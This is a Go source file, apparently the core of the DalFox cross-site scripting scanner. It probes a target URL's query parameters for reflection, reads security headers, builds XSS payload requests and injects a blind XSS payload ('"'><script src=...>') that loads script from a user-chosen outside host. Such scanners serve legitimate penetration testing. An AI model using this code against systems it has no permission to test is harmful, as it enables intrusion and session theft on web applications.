package core

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/briandowns/spinner"
	"github.com/projectdiscovery/gologger"
)

// Scan is main scanning function
func Scan(target string, options_string map[string]string, options_bool map[string]bool) {
	gologger.Infof("Target URL: %s", target)
	//var params []string

	// query is XSS payloads
	query := make(map[string]map[string]string)

	// params is "param name":true  (reflected?)
	// 1: non-reflected , 2: reflected , 3: reflected-with-sc
	params := make(map[string][]string)

	// policy is "CSP":domain..
	policy := make(map[string]string)
	_ = params
	_ = policy

	_, err := url.Parse(target)
	if err != nil {
		gologger.Infof("%s from URL check logic", err)
		gologger.Infof("Not running %s url", target)
		return
	}

	var wait sync.WaitGroup
	wait.Add(2)
	go func() {
		defer wait.Done()
		gologger.Infof("start static analysis..🔍")
		policy = StaticAnalysis(target, options_string)
	}()
	go func() {
		defer wait.Done()
		gologger.Infof("start parameter analysis..🔍")
		params = ParameterAnalysis(target, options_string)
	}()
	s := spinner.New(spinner.CharSets[7], 100*time.Millisecond) // Build our new spinner
	s.Suffix = " Waiting routines.."
	time.Sleep(1 * time.Second) // Waiting log
	s.Start()                   // Start the spinner
	time.Sleep(3 * time.Second) // Run for some time to simulate work
	wait.Wait()
	s.Stop()
	for k, v := range policy {
		if len(v) != 0 {
			fmt.Printf("- @INFO %s is %s\n", k, v)
		}
	}

	for k, v := range params {
		if len(v) != 0 {
			char := strings.Join(v, "  ")
			fmt.Printf("- @INFO Reflected '%s' param => %s\n", k, char)
		}
	}

	if !options_bool["only-discovery"] {
		// XSS Scanning

		gologger.Infof("Generate XSS payload and Optimization..")
		// Optimization..

		/*
			k: parama name
			v: pattern [injs, inhtml, ' < > ]
			av: reflected type, valid char
		*/
		for k, v := range params {
			if (options_string["p"] == "") || (options_string["p"] == k) {
				chars := GetSpecialChar()
				var badchars []string
				for _, av := range v {
					if indexOf(av, chars) == -1 {
						badchars = append(badchars, av)
					}
				}
				for _, av := range v {
					if strings.Contains(av, "inJS") {
						// inJS XSS
						arr := getInJsPayload()
						for _, avv := range arr {
							if Optimization(avv, badchars) {
								tq := MakeRequestQuery(target, k, avv)
								tm := map[string]string{"param": k}
								tm["type"] = "inJS"
								tm["payload"] = avv
								query[tq] = tm
							}
						}
						ara := getForceSeleniumPayload()
						for _, v := range ara {
							tq := MakeRequestQuery(target, k, v)
							tm := map[string]string{"param": k}
							tm["type"] = "inJS"
							tm["payload"] = "PloyGlot(inJS)"
							query[tq] = tm
						}
					}
					// inHTML XSS
					if strings.Contains(av, "inHTML") {
						arr := getCommonPayload()
						for _, avv := range arr {
							if Optimization(avv, badchars) {
								tq := MakeRequestQuery(target, k, avv)
								tm := map[string]string{"param": k}
								tm["type"] = "inHTML"
								tm["payload"] = avv
								query[tq] = tm
							}
						}
						ara := getForceSeleniumPayload()
						for _, v := range ara {
							tq := MakeRequestQuery(target, k, v)
							tm := map[string]string{"param": k}
							tm["type"] = "inJS"
							tm["payload"] = "PloyGlot(inHTML)"
							query[tq] = tm
						}
					}
				}
			}
		}
		// Static payload
		//fmt.Println(query)
		spu, _ := url.Parse(target)
		spd := spu.Query()
		for spk, _ := range spd {
			tq := MakeRequestQuery(target, spk, "\"'><script src="+options_string["blind"]+"></script>")
			tm := map[string]string{"param": spk}
			tm["type"] = "toBlind"
			tm["payload"] = "Blind"
			query[tq] = tm
		}

		//fmt.Println(query)
		gologger.Infof("Start XSS Scanning")

		for k, v := range query {
			resbody, resp := SendReq(k, options_string)
			_ = resp
			if v["type"] != "inBlind" {
				if v["type"] != "inJS" {
					if VerifyReflection(resbody, v["payload"]) {
						fmt.Println("[VULN/XSS] Reflected Payload: " + v["param"] + "=" + v["payload"])
						fmt.Println(" + " + k)
					}
				} else {
					if VerifyReflection(resbody, v["payload"]) {
						fmt.Println("[VULN/XSS] Reflected Payload: " + v["param"] + "=" + v["payload"])
						fmt.Println(" + " + k)
					}
				}
			}
		}

		/*
			task := 1
			var wg sync.WaitGroup
			wg.Add(task)
			go func() {
				defer wg.Done()
			}()
			wg.Wait()
		*/
	}
}

// VerifyReflection is check reflected xss pattern
func VerifyReflection(body, payload string) bool {
	if strings.Contains(body, payload) {
		return true
	} else {
		return false
	}
}

// VerifySelenium is check trigger xss pattern
func VerifySelenium() {

}

// StaticAnalysis is found information on original req/res
func StaticAnalysis(target string, options_string map[string]string) map[string]string {
	policy := make(map[string]string)
	resbody, resp := SendReq(target, options_string)
	//gologger.Verbosef("<INFO>"+resp.Status, "asdf")
	//fmt.Println(resp.Header)
	_ = resbody
	if resp.Header["Content-Type"] != nil {
		policy["Content-Type"] = resp.Header["Content-Type"][0]
	}
	if resp.Header["Content-Security-Policy"] != nil {
		policy["Content-Security-Policy"] = resp.Header["Content-Security-Policy"][0]
	}
	if resp.Header["X-Frame-Options"] != nil {
		policy["X-Frame-Options"] = resp.Header["X-Frame-Options"][0]
	}

	return policy
}

// ParameterAnalysis is check reflected and mining params
func ParameterAnalysis(target string, options_string map[string]string) map[string][]string {
	u, err := url.Parse(target)
	params := make(map[string][]string)
	if err != nil {
		gologger.Fatalf("Fatal error %s", err)
		return params
	}
	p, _ := url.ParseQuery(u.RawQuery)
	for k, _ := range p {
		if (options_string["p"] == "") || (options_string["p"] == k) {
			//temp_url := u
			//temp_q := u.Query()
			//temp_q.Set(k, v[0]+"DalFox")
			/*
				data := u.String()
				data = strings.Replace(data, k+"="+v[0], k+"="+v[0]+"DalFox", 1)
				temp_url, _ := url.Parse(data)
				temp_q := temp_url.Query()
				temp_url.RawQuery = temp_q.Encode()
			*/
			temp_url := MakeRequestQuery(target, k, "DalFox")

			//temp_url.RawQuery = temp_q.Encode()
			resbody, resp := SendReq(temp_url, options_string)
			_ = resp
			if strings.Contains(resbody, "DalFox") {
				pointer, _ := Abstraction(resbody)
				var smap string
				ih := 0
				ij := 0
				for _, sv := range pointer {
					if sv == "inHTML" {
						ih = ih + 1
					}
					if sv == "inJS" {
						ij = ij + 1
					}
				}
				if ih > 0 {
					smap = smap + "inHTML[" + strconv.Itoa(ih) + "] "
				}
				if ij > 0 {
					smap = smap + "inJS[" + strconv.Itoa(ij) + "] "
				}
				params[k] = append(params[k], smap)
				var wg sync.WaitGroup
				chars := GetSpecialChar()
				for _, char := range chars {
					wg.Add(1)
					/*
						tdata := u.String()
						tdata = strings.Replace(tdata, k+"="+v[0], k+"="+v[0]+"DalFox"+char, 1)
						turl, _ := url.Parse(tdata)
						tq := turl.Query()
						turl.RawQuery = tq.Encode()
					*/

					turl := MakeRequestQuery(target, k, "DalFox"+char)

					/* turl := u
					q := u.Query()
					q.Set(k, v[0]+"DalFox"+string(char))
					turl.RawQuery = q.Encode()
					*/
					ccc := string(char)
					go func() {
						defer wg.Done()
						resbody, resp := SendReq(turl, options_string)
						_ = resp
						if strings.Contains(resbody, "DalFox"+ccc) {
							params[k] = append(params[k], ccc)
						}
					}()
				}
				wg.Wait()
			}
		}
	}
	return params
}

// SendReq is sending http request (handled GET/POST)
func SendReq(url string, options_string map[string]string) (string, *http.Response) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		gologger.Fatalf("Fatal error %s", err)
	}

	if options_string["header"] != "" {
		h := strings.Split(options_string["header"], ": ")
		if len(h) > 1 {
			req.Header.Add(h[0], h[1])
		}
	}
	if options_string["cookie"] != "" {
		req.Header.Add("Cookie", options_string["cookie"])
	}
	if options_string["ua"] != "" {
		req.Header.Add("User-Agent", options_string["ua"])
	} else {
		req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0")
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		gologger.Fatalf("Fatal error %s", err)
	}
	defer resp.Body.Close()

	bytes, _ := ioutil.ReadAll(resp.Body)
	str := string(bytes)
	return str, resp
}

func indexOf(element string, data []string) int {
	for k, v := range data {
		if element == v {
			return k
		}
	}
	return -1 //not found.
}
